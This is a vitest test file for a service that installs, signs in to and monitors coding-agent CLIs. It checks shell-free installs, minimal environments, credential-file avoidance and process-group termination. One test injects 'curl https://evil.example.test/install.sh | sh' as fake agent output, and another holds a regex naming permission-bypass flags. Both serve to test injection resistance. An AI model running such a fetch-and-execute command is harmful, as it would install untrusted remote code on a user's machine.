import { EventEmitter } from "node:events";
import {
  chmodSync,
  existsSync,
  mkdirSync,
  readFileSync,
  rmSync,
  statSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { dirname, join } from "node:path";
import { expect, test } from "vitest";
import { createRunnerService } from "../service/service.ts";
import { openSqliteStore } from "../sqlite-store.ts";
import { AGENT_PROFILES } from "../test-helpers/agent-profiles.ts";
import {
  FAKE_CLAUDE_PATH,
  FAKE_HELP,
  makeFakeHome,
  readFakeCalls,
  writeFakeScript,
} from "../test-helpers/fake-claude-script.ts";
import { AGENT_CATALOG } from "./catalog.ts";
import { createAgentSetup } from "./setup.ts";

async function fixture(installed = false, loggedIn = false, noInstall = false) {
  const home = makeFakeHome({ auth: { loggedIn } });
  const bin = join(home, "bin");
  mkdirSync(bin);
  if (installed) symlinkSync(FAKE_CLAUDE_PATH, join(bin, "claude"));
  const store = await openSqliteStore(":memory:");
  const calls: unknown[] = [];
  const signIns: unknown[] = [];
  const permissionAtSpawn: unknown[] = [];
  const topics: string[] = [];
  const timerPeriods: number[] = [];
  const children: (EventEmitter & { stderr: EventEmitter; kill: () => boolean })[] = [];
  const timers: (() => void)[] = [];
  const opened: string[] = [];
  let ms = Date.parse("2026-11-23T00:00:00Z");
  const service = createRunnerService({
    store,
    now: () => new Date(ms),
    dataDir: home,
    mode: "demo",
    env: {
      HOME: home,
      PATH: `${bin}:${process.env.PATH}`,
      USER: "test",
      LANG: "en",
      TMPDIR: home,
      SECRET: "hidden",
    },
    markChanged: (topic) => topics.push(topic),
    agents: {
      catalog: AGENT_CATALOG.map((entry) => ({
        ...entry,
        install: noInstall
          ? null
          : {
              program: AGENT_PROFILES[entry.id].install.command,
              args: AGENT_PROFILES[entry.id].install.args,
            },
      })),
      fs: {
        statSync,
        openSync: ((path: string) => {
          opened.push(path);
          throw new Error("unexpected open");
        }) as typeof import("node:fs").openSync,
      },
      extraDirs: [],
      claudePath: join(bin, "claude"),
      codexPath: join(bin, "codex"),
      spawnInstall: (program, args, options) => {
        permissionAtSpawn.push(store.getSetting("agentPermission"));
        calls.push({ program, args, ...options });
        const child = Object.assign(new EventEmitter(), { stderr: new EventEmitter(), kill: () => true });
        children.push(child);
        return child;
      },
      spawnSignIn: (program, args, options) => {
        signIns.push({ program, args, ...options });
      },
      every: (ms, fn) => {
        timerPeriods.push(ms);
        timers.push(fn);
        return () => {
          const i = timers.indexOf(fn);
          if (i >= 0) timers.splice(i, 1);
        };
      },
    },
  });
  return {
    home,
    advance(n: number) {
      ms += n;
    },
    bin,
    store,
    calls,
    signIns,
    permissionAtSpawn,
    topics,
    timerPeriods,
    children,
    timers,
    opened,
    service,
    async list() {
      return service.call("agents.list", {});
    },
    async setup(id = "claude-code") {
      return service.call("agents.setUp", { agentId: id });
    },
    install() {
      symlinkSync(FAKE_CLAUDE_PATH, join(bin, "claude"));
    },
    loggedIn() {
      writeFakeScript(home, { auth: { loggedIn: true } });
    },
    close() {
      service.stop();
      store.close();
      rmSync(home, { recursive: true, force: true });
    },
  };
}

test("TC-j01-06 TC-AGT-05 permission then install then sign-in and ready", async () => {
  const f = await fixture();
  try {
    await f.list();
    expect(await f.setup()).toMatchObject({ state: "installing" });
    expect(f.store.getSetting("agentPermission")).toBe("on");
    expect(f.calls).toHaveLength(1);
    expect(f.permissionAtSpawn).toEqual(["on"]);
    expect(f.timerPeriods).toEqual([600000]);
    f.install();
    f.children[0]?.emit("close", 0);
    await expect
      .poll(() => f.store.getHarnessState("claude-code")?.state, { timeout: 5000 })
      .toBe("waiting_login");
    expect(f.signIns).toMatchObject([
      { program: join(f.bin, "claude"), args: ["auth", "login"], shell: false, cwd: f.home },
    ]);
    expect(f.timerPeriods).toEqual([600000, 2000]);
    for (let poll = 0; poll < 2; poll++) {
      const before = readFakeCalls(f.home).length;
      f.timers[0]?.();
      await expect.poll(() => readFakeCalls(f.home).length, { timeout: 5000 }).toBe(before + 1);
      await new Promise((resolve) => setTimeout(resolve, 200));
      expect(f.store.getHarnessState("claude-code")?.state).toBe("waiting_login");
    }
    f.loggedIn();
    f.timers[0]?.();
    await expect.poll(() => f.store.getHarnessState("claude-code")?.state, { timeout: 5000 }).toBe("ready");
    expect(
      f.store
        .listAudit()
        .filter((a) => a.kind === "agent_setup")
        .map((a) =>
          a.detail && typeof a.detail === "object" && !Array.isArray(a.detail) ? a.detail.phase : undefined,
        ),
    ).toEqual(["installing", "installed", "waiting_login", "ready"]);
  } finally {
    f.close();
  }
});

test("TC-j01-07 TC-AGT-08 signed-out setup skips installation", async () => {
  const f = await fixture(true);
  try {
    await f.list();
    expect(await f.setup()).toMatchObject({ state: "waiting_login" });
    expect(f.calls).toEqual([]);
    expect(f.signIns).toHaveLength(1);
    f.loggedIn();
    f.timers[0]?.();
    await expect.poll(() => f.store.getHarnessState("claude-code")?.state).toBe("ready");
  } finally {
    f.close();
  }
});

test("TC-j01-08 TC-SR6-08 installer receives only catalog argv without shell and minimal environment", async () => {
  const f = await fixture();
  try {
    await f.list();
    expect(f.calls).toEqual([]);
    await f.setup();
    const call = f.calls[0] as {
      program: string;
      args: string[];
      shell: boolean;
      env: Record<string, string>;
    };
    expect(call).toMatchObject({
      program: AGENT_PROFILES["claude-code"].install.command,
      args: AGENT_PROFILES["claude-code"].install.args,
      shell: false,
    });
    expect(Object.keys(call.env).sort()).toEqual(["HOME", "LANG", "PATH", "TMPDIR", "USER"]);
    expect(call.args.join(" ")).not.toMatch(/--yolo|--dangerously-skip-permissions|danger-full-access/);
  } finally {
    f.close();
  }
});

test("TC-j01-19 ready agent gives permission only", async () => {
  const f = await fixture(true, true);
  try {
    await f.list();
    expect(await f.setup()).toMatchObject({ state: "ready" });
    expect(f.store.getSetting("agentPermission")).toBe("on");
    expect(f.calls).toEqual([]);
    expect(f.signIns).toEqual([]);
    expect(f.timers).toEqual([]);
  } finally {
    f.close();
  }
});

test("TC-j01-21 TC-AGT-06 failed install records sanitized detail and permits retry", async () => {
  const f = await fixture();
  try {
    await f.list();
    await f.setup();
    f.children[0]?.stderr.emit("data", Buffer.from(`network unreachable\u0001\nsecret path`));
    f.children[0]?.emit("close", 1);
    await expect
      .poll(() => f.store.getHarnessState("claude-code")?.problem)
      .toMatchObject({ code: "install_failed", detail: "network unreachable" });
    expect(f.store.getSetting("agentPermission")).toBe("on");
    expect(f.timers).toEqual([]);
    expect(await f.setup()).toMatchObject({ state: "installing" });
  } finally {
    f.close();
  }
});

test("TC-AGT-09 unknown and concurrent setup refuse without changing permission", async () => {
  const f = await fixture();
  try {
    await f.list();
    await expect(f.setup("unknown-agent")).rejects.toMatchObject({ code: "not_found" });
    expect(f.store.getSetting("agentPermission")).not.toBe("on");
    await f.setup();
    await expect(f.setup()).rejects.toMatchObject({ code: "conflict" });
  } finally {
    f.close();
  }
});

test("TC-AGT-09 unavailable install leaves state permission and audit unchanged", async () => {
  const f = await fixture(false, false, true);
  try {
    await f.list();
    const before = f.store.getHarnessState("claude-code");
    const audit = f.store.listAudit();
    await expect(f.setup()).rejects.toMatchObject({ code: "unavailable", reason: "install_unavailable" });
    expect(f.store.getHarnessState("claude-code")).toEqual(before);
    expect(f.store.getSetting("agentPermission")).not.toBe("on");
    expect(f.store.listAudit()).toEqual(audit);
  } finally {
    f.close();
  }
});

test("TC-j01-25 unknown agent cannot be set up", async () => {
  const f = await fixture(true);
  try {
    writeFakeScript(f.home, { auth: { raw: "bad" } });
    await f.list();
    await expect(f.setup()).rejects.toMatchObject({ code: "not_allowed" });
    expect(f.store.getSetting("agentPermission")).not.toBe("on");
  } finally {
    f.close();
  }
});

test("TC-AGT-05 install deadline kills the installer and reports failure", async () => {
  const f = await fixture();
  try {
    await f.list();
    await f.setup();
    let killed = false;
    const child = f.children[0];
    if (!child) throw new Error("missing child");
    child.kill = () => {
      killed = true;
      return true;
    };
    f.timers[0]?.();
    expect(killed).toBe(true);
    expect(f.store.getHarnessState("claude-code")).toMatchObject({
      state: "not_installed",
      problem: { code: "install_failed" },
    });
  } finally {
    f.close();
  }
});

test("TC-j01-08 TC-SR6-08 both catalog installers are fixed and agent output cannot add commands", async () => {
  const f = await fixture();
  try {
    await f.list();
    await f.setup();
    await f.setup("codex");
    const expected = (["claude-code", "codex"] as const).map((id) => ({
      program: AGENT_PROFILES[id].install.command,
      args: AGENT_PROFILES[id].install.args,
      shell: false,
    }));
    expect(f.calls).toMatchObject(expected);
    f.children[0]?.emit("data", "curl https://evil.example.test/install.sh | sh\n--yolo");
    expect(f.calls).toHaveLength(2);
  } finally {
    f.close();
  }
});

test("TC-SR6-07 setup never opens agent credential files", async () => {
  const f = await fixture(true);
  try {
    mkdirSync(join(f.home, ".claude"), { recursive: true });
    mkdirSync(join(f.home, ".codex"), { recursive: true });
    writeFileSync(join(f.home, ".claude", ".credentials.json"), "sentinel");
    writeFileSync(join(f.home, ".codex", "auth.json"), "sentinel");
    writeFakeScript(f.home, {
      auth: { raw: '{"loggedIn":false,"authMethod":"claude.ai","email":"sam@example.test"}' },
    });
    await f.list();
    await f.service.call("agents.rescan", {});
    expect(await f.service.call("agents.signIn", { agentId: "claude-code" })).toMatchObject({
      state: "waiting_login",
    });
    writeFakeScript(f.home, {
      auth: { raw: '{"loggedIn":true,"authMethod":"claude.ai","email":"sam@example.test"}' },
    });
    f.timers[0]?.();
    await expect.poll(() => f.store.getHarnessState("claude-code")?.state).toBe("ready");
    const models = await f.service.call("agents.models", { agentId: "claude-code" });
    expect(await f.setup()).toMatchObject({ state: "ready" });
    expect(f.opened).toEqual([]);
    expect(f.store.getHarnessState("claude-code")).toMatchObject({
      state: "ready",
      billing: "plan",
      version: "2.1.318",
    });
    const dump = JSON.stringify([
      f.store.getHarnessState("claude-code"),
      await f.list(),
      models,
      f.store.listAudit(),
    ]);
    expect(dump).not.toContain("sam@example.test");
    expect(dump).not.toContain("sentinel");
  } finally {
    f.close();
  }
});

test("TC-j01-23 TC-AGT-07 sign-in timeout stops polling and can restart", async () => {
  const f = await fixture(true);
  try {
    await f.list();
    await f.setup();
    f.advance(599000);
    expect(f.store.getHarnessState("claude-code")?.state).toBe("waiting_login");
    f.advance(1000);
    const count = readFakeCalls(f.home).length;
    f.timers[0]?.();
    expect(f.store.getHarnessState("claude-code")).toMatchObject({
      state: "needs_login",
      problem: { code: "sign_in_timeout" },
    });
    expect(f.timers).toHaveLength(0);
    f.advance(60000);
    expect(readFakeCalls(f.home)).toHaveLength(count);
    expect(f.store.listAudit()).toContainEqual(
      expect.objectContaining({
        kind: "agent_setup",
        detail: { agentId: "claude-code", phase: "sign_in_timeout" },
      }),
    );
    expect(await f.service.call("agents.signIn", { agentId: "claude-code" })).toMatchObject({
      state: "waiting_login",
    });
    f.loggedIn();
    f.timers[0]?.();
    await expect.poll(() => f.store.getHarnessState("claude-code")?.state).toBe("ready");
  } finally {
    f.close();
  }
});

test("TC-AGT-10 sign in requires no permission and refuses duplicate and missing agents", async () => {
  const f = await fixture(true);
  try {
    await f.list();
    expect(await f.service.call("agents.signIn", { agentId: "claude-code" })).toMatchObject({
      state: "waiting_login",
    });
    expect(f.store.getSetting("agentPermission") ?? "unset").toBe("unset");
    expect(f.store.listAudit()).toContainEqual(expect.objectContaining({ kind: "agent_sign_in" }));
    await expect(f.service.call("agents.signIn", { agentId: "claude-code" })).rejects.toMatchObject({
      code: "conflict",
      reason: "setup_running",
    });
    await expect(f.service.call("agents.signIn", { agentId: "codex" })).rejects.toMatchObject({
      code: "not_allowed",
      reason: "agent_not_installed",
    });
    expect(f.opened).toEqual([]);
    f.loggedIn();
    f.timers[0]?.();
    await expect.poll(() => f.store.getHarnessState("claude-code")?.state).toBe("ready");
  } finally {
    f.close();
  }
});

test("TC-j01-27 TC-AGT-12 restart clears stale setup without restarting installation", async () => {
  const f = await fixture();
  try {
    await f.list();
    await f.setup();
    expect(f.store.getHarnessState("claude-code")).toHaveProperty("setUp.phase", "installing");
    f.service.stop();
    const next = createRunnerService({
      store: f.store,
      dataDir: f.home,
      mode: "demo",
      env: { HOME: f.home, PATH: `${f.bin}:${process.env.PATH}` },
      agents: {
        extraDirs: [],
        claudePath: join(f.bin, "claude"),
        codexPath: join(f.bin, "codex"),
        spawnInstall: () => {
          throw new Error("install restarted");
        },
      },
    });
    try {
      expect(await next.call("agents.list", {})).toMatchObject([
        { state: "not_installed" },
        { state: "not_installed" },
      ]);
      expect(f.store.getHarnessState("claude-code")?.setUp).toBeUndefined();
      expect(f.store.getSetting("agentPermission")).toBe("on");
    } finally {
      next.stop();
    }
  } finally {
    f.close();
  }
});

test("TC-j01-09 setup detects sign-in with status and never reads credentials", async () => {
  const f = await fixture(true);
  try {
    mkdirSync(join(f.home, ".claude"), { recursive: true });
    const secret = "fake-token-" + "0123456789abcdef";
    writeFileSync(join(f.home, ".claude", "credentials.json"), secret);
    await f.list();
    await f.setup();
    f.loggedIn();
    f.timers[0]?.();
    await expect.poll(() => f.store.getHarnessState("claude-code")?.state).toBe("ready");
    const listed = await f.list();
    expect(f.opened).not.toContain(join(f.home, ".claude", "credentials.json"));
    expect(
      JSON.stringify([listed, f.store.getHarnessState("claude-code"), f.store.listAudit()]),
    ).not.toContain(secret);
    expect(
      readFakeCalls(f.home).every(
        (call) =>
          call.kind === "call" && ["--version", "--help", "auth status --json"].includes(call.args.join(" ")),
      ),
    ).toBe(true);
    await expect(
      f.service.call("agents.setUp", { agentId: "claude-code", extra: true }),
    ).rejects.toMatchObject({ code: "invalid_input" });
  } finally {
    f.close();
  }
});

test("TC-j01-28 setup records permission and install with window source", async () => {
  const f = await fixture();
  try {
    await f.list();
    await f.setup();
    expect(f.store.listAudit()).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          at: "2026-11-23T00:00:00.000Z",
          kind: "permission_changed",
          detail: { from: "unset", to: "on", source: "window" },
        }),
        expect.objectContaining({
          at: "2026-11-23T00:00:00.000Z",
          kind: "agent_setup",
          detail: { agentId: "claude-code", phase: "installing" },
        }),
      ]),
    );
    expect(f.store.getSetting("agentPermission")).toBe("on");
    await expect(f.service.call("agents.setUp", { agentId: "codex" }, "tool")).rejects.toMatchObject({
      code: "not_allowed",
      reason: "caller_not_allowed",
    });
    expect(f.calls).toHaveLength(1);
  } finally {
    f.close();
  }
});

test("TC-j01-27 restart detects a present agent as ready or signed out", async () => {
  for (const loggedIn of [true, false]) {
    const f = await fixture();
    try {
      await f.list();
      await f.setup();
      f.service.stop();
      f.install();
      writeFakeScript(f.home, { auth: { loggedIn } });
      let installs = 0;
      const next = createRunnerService({
        store: f.store,
        dataDir: f.home,
        mode: "demo",
        env: { HOME: f.home, PATH: `${f.bin}:${process.env.PATH}` },
        agents: {
          extraDirs: [],
          claudePath: join(f.bin, "claude"),
          codexPath: join(f.bin, "codex"),
          spawnInstall: () => {
            installs++;
            throw new Error("unexpected install");
          },
        },
      });
      try {
        await next.start().settled;
        expect(await next.call("agents.list", {})).toMatchObject([
          { state: loggedIn ? "ready" : "needs_login" },
          { state: "not_installed" },
        ]);
        expect(f.store.getHarnessState("claude-code")?.setUp).toBeUndefined();
        expect(f.store.getSetting("agentPermission")).toBe("on");
        expect(((await next.call("settings.get", {})) as { mainAgent: unknown }).mainAgent).toBeNull();
        expect(installs).toBe(0);
      } finally {
        next.stop();
      }
    } finally {
      f.close();
    }
  }
});

test("sign-in starts the detected binary path (explicit claudePath and fallback folder)", async () => {
  for (const mode of ["explicit", "fallback"] as const) {
    const home = makeFakeHome({ auth: { loggedIn: false } });
    const store = await openSqliteStore(":memory:");
    const signIns: unknown[] = [];
    const customDir = join(home, mode === "explicit" ? "custom" : "fallback");
    const emptyBin = join(home, "empty-bin");
    mkdirSync(customDir, { recursive: true });
    mkdirSync(emptyBin, { recursive: true });
    symlinkSync(process.execPath, join(emptyBin, "node"));
    const binaryPath = join(customDir, "claude");
    symlinkSync(FAKE_CLAUDE_PATH, binaryPath);
    const service = createRunnerService({
      store,
      dataDir: home,
      mode: "demo",
      env: { HOME: home, PATH: emptyBin, USER: "test", LANG: "en", TMPDIR: home },
      agents: {
        extraDirs: mode === "explicit" ? [] : [customDir],
        ...(mode === "explicit" ? { claudePath: binaryPath } : {}),
        codexPath: join(emptyBin, "codex"),
        spawnSignIn: (program, args, options) => {
          signIns.push({ program, args, ...options });
        },
        every: () => () => {},
      },
    });
    try {
      await service.call("agents.list", {});
      await service.call("agents.signIn", { agentId: "claude-code" });
      expect(signIns).toHaveLength(1);
      const call = signIns[0] as {
        program: string;
        args: string[];
        shell: boolean;
        cwd: string;
        env: Record<string, string>;
      };
      expect(call).toMatchObject({
        program: binaryPath,
        args: ["auth", "login"],
        shell: false,
        cwd: home,
      });
      expect(Object.keys(call.env).sort()).toEqual(["HOME", "LANG", "PATH", "TMPDIR", "USER"]);
    } finally {
      service.stop();
      store.close();
      rmSync(home, { recursive: true, force: true });
    }
  }
});

test("TC-j01-25 too-old agent signIn is refused with no spawn, no audit and problem kept", async () => {
  const f = await fixture(true);
  try {
    writeFakeScript(f.home, { help: FAKE_HELP.replace("--json-schema\n", "") });
    expect(await f.list()).toMatchObject([
      { id: "claude-code", state: "unknown", problem: { code: "too_old" } },
      { id: "codex", state: "not_installed" },
    ]);
    const auditBefore = f.store.listAudit();
    await expect(f.service.call("agents.signIn", { agentId: "claude-code" })).rejects.toMatchObject({
      code: "not_allowed",
      reason: "agent_not_ready",
    });
    expect(f.signIns).toEqual([]);
    expect(f.store.listAudit()).toEqual(auditBefore);
    expect(f.store.getHarnessState("claude-code")).toMatchObject({
      state: "unknown",
      problem: { code: "too_old" },
    });
  } finally {
    f.close();
  }
});

test("sign-in child process group gets SIGTERM then SIGKILL on timeout, ready, and stop", {
  timeout: 20_000,
}, async () => {
  for (const mode of ["timeout", "ready", "stop"] as const) {
    const home = makeFakeHome();
    const bin = join(home, "bin");
    mkdirSync(bin, { recursive: true });
    const startedFile = join(home, "signin-started");
    const statusFile = join(home, "status.json");
    writeFileSync(statusFile, '{"loggedIn":false}');
    const claudeScript = join(bin, "claude");
    writeFileSync(
      claudeScript,
      `#!/usr/bin/env node
const { writeFileSync, readFileSync } = require("node:fs");
const args = process.argv.slice(2).join(" ");
if (args === "--version") { console.log("2.1.318"); process.exit(0); }
if (args === "auth status --json") { console.log(readFileSync(${JSON.stringify(statusFile)}, "utf8")); process.exit(0); }
if (args === "auth login") {
  process.on("SIGTERM", () => {});
  writeFileSync(${JSON.stringify(startedFile)}, String(process.pid));
  setInterval(() => {}, 10000);
}
`,
    );
    chmodSync(claudeScript, 0o755);
    const store = await openSqliteStore(":memory:");
    let ms = Date.parse("2026-11-23T00:00:00Z");
    const timers: (() => void)[] = [];
    const signals: [number, NodeJS.Signals][] = [];
    let pid: number | undefined;
    store.putHarnessState({
      id: "claude-code",
      state: "needs_login",
      stateAt: new Date(ms).toISOString(),
      version: "2.1.318",
      billing: "unknown",
    });
    const setup = createAgentSetup({
      store,
      cwd: home,
      env: { HOME: home, PATH: `${bin}:${dirname(process.execPath)}` },
      now: () => new Date(ms),
      extraDirs: [],
      claudePath: claudeScript,
      every: (_ms, fn) => {
        timers.push(fn);
        return () => {
          const i = timers.indexOf(fn);
          if (i >= 0) timers.splice(i, 1);
        };
      },
      killGroup: (groupPid, sig) => {
        signals.push([groupPid, sig]);
        process.kill(-groupPid, sig);
      },
    });
    try {
      expect(await setup.signIn("claude-code")).toEqual({});
      await expect.poll(() => existsSync(startedFile)).toBe(true);
      pid = Number(readFileSync(startedFile, "utf8"));
      if (mode === "timeout") {
        ms += 600_000;
        timers[0]?.();
      } else if (mode === "ready") {
        writeFileSync(statusFile, '{"loggedIn":true}');
        timers[0]?.();
        await expect.poll(() => store.getHarnessState("claude-code")?.state).toBe("ready");
      } else {
        setup.stop();
      }
      expect(signals[0]).toEqual([pid, "SIGTERM"]);
      await expect
        .poll(() => signals, { timeout: 5000 })
        .toEqual([
          [pid, "SIGTERM"],
          [pid, "SIGKILL"],
        ]);
      await expect
        .poll(() => {
          try {
            process.kill(pid ?? -1, 0);
            return true;
          } catch {
            return false;
          }
        })
        .toBe(false);
    } finally {
      setup.stop();
      if (pid !== undefined) {
        try {
          process.kill(-pid, "SIGKILL");
        } catch {}
      }
      store.close();
      rmSync(home, { recursive: true, force: true });
    }
  }
});

test("default installer process group gets SIGTERM then SIGKILL on timeout and SIGKILL at once on stop", {
  timeout: 20_000,
}, async () => {
  for (const mode of ["timeout", "stop"] as const) {
    const home = makeFakeHome();
    const bin = join(home, "bin");
    mkdirSync(bin, { recursive: true });
    const startedFile = join(home, "install-started");
    const installerScript = join(bin, "fake-installer");
    writeFileSync(
      installerScript,
      `#!/usr/bin/env node
const { writeFileSync } = require("node:fs");
process.on("SIGTERM", () => {});
writeFileSync(${JSON.stringify(startedFile)}, String(process.pid));
setInterval(() => {}, 10000);
`,
    );
    chmodSync(installerScript, 0o755);
    const store = await openSqliteStore(":memory:");
    let ms = Date.parse("2026-11-23T00:00:00Z");
    const timers: (() => void)[] = [];
    const signals: [number, NodeJS.Signals][] = [];
    let pid: number | undefined;
    const catalog = AGENT_CATALOG.map((entry) =>
      entry.id === "claude-code" ? { ...entry, install: { program: installerScript, args: [] } } : entry,
    );
    const setup = createAgentSetup({
      store,
      cwd: home,
      env: { HOME: home, PATH: `${bin}:${dirname(process.execPath)}` },
      now: () => new Date(ms),
      extraDirs: [],
      catalog,
      every: (_ms, fn) => {
        timers.push(fn);
        return () => {
          const i = timers.indexOf(fn);
          if (i >= 0) timers.splice(i, 1);
        };
      },
      killGroup: (groupPid, sig) => {
        signals.push([groupPid, sig]);
        process.kill(-groupPid, sig);
      },
    });
    try {
      expect(await setup.setUp("claude-code")).toEqual({});
      await expect.poll(() => existsSync(startedFile)).toBe(true);
      pid = Number(readFileSync(startedFile, "utf8"));
      if (mode === "timeout") {
        ms += 600_000;
        timers[0]?.();
        expect(signals[0]).toEqual([pid, "SIGTERM"]);
        await expect
          .poll(() => signals, { timeout: 5000 })
          .toEqual([
            [pid, "SIGTERM"],
            [pid, "SIGKILL"],
          ]);
      } else {
        setup.stop();
        expect(signals).toEqual([[pid, "SIGKILL"]]);
      }
      await expect
        .poll(() => {
          try {
            process.kill(pid ?? -1, 0);
            return true;
          } catch {
            return false;
          }
        })
        .toBe(false);
    } finally {
      setup.stop();
      if (pid !== undefined) {
        try {
          process.kill(-pid, "SIGKILL");
        } catch {}
      }
      store.close();
      rmSync(home, { recursive: true, force: true });
    }
  }
});
